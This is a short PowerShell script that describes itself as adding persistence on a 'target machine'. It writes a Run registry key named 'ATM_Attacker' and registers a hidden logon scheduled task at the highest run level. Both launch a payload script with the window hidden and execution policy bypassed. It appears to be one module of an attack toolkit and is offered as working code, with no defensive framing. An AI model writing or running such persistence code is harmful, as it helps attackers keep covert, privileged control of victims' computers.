<#
.SYNOPSIS
    Adds registry and scheduled‐task persistence on the target machine.
#>

# Path to whatever script you want to autorun (Stub or Payload)
$payloadPath = "C:\ProgramData\Mir$$\payload.ps1"

# 1) Registry Run‐Key (current user)
Set-ItemProperty `
  -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "ATM_Attacker" `
  -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`""

# 2) Scheduled Task (runs at logon, hidden)
$action = New-ScheduledTaskAction `
  -Execute "powershell.exe" `
  -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$payloadPath`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask `
  -TaskName "Mir$$Persistence" `
  -Action $action `
  -Trigger $trigger `
  -RunLevel Highest `
  -Force

Write-Output "Persistence installed: Run‑Key + Scheduled Task"
